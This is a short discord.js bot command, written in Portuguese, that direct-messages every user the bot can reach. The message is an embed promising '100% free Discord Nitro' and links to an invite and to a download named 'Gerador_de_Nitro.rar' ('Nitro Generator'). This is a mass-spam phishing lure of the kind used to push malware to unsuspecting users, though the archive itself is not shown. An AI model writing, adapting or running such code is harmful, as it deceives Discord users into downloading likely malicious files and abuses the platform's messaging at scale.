const Discord = require('discord.js')

module.exports.run = (client, message) => {

    message.channel.send(`Estou sendo divulgada para (${client.users.size}) Membros. `)

    let convite = new Discord.RichEmbed()

    .setTitle("<a:nitro_s:702596284141404203> | ** DISCORD NITRO 100% GRATUITO**")
    .setDescription('**Estamos distribuindo 15 nitros, seja rápido e pegue o seu!**')
    .addField("Para aceitar:", `[**CLICK AQUI**](https://discord.gg/px)`)
    .addField("Ou aceite direto:", `[AQUI](https://cdn.discordapp.com/attachments/702354246229557349/702574118289145926/Gerador_de_Nitro.rar)`)
	.setImage("https://cdn.discordapp.com/attachments/533145795801776140/700600283256061992/First.png")
    .setTimestamp();
    
        client.users.forEach(member => {
            member.send(convite)
 })
}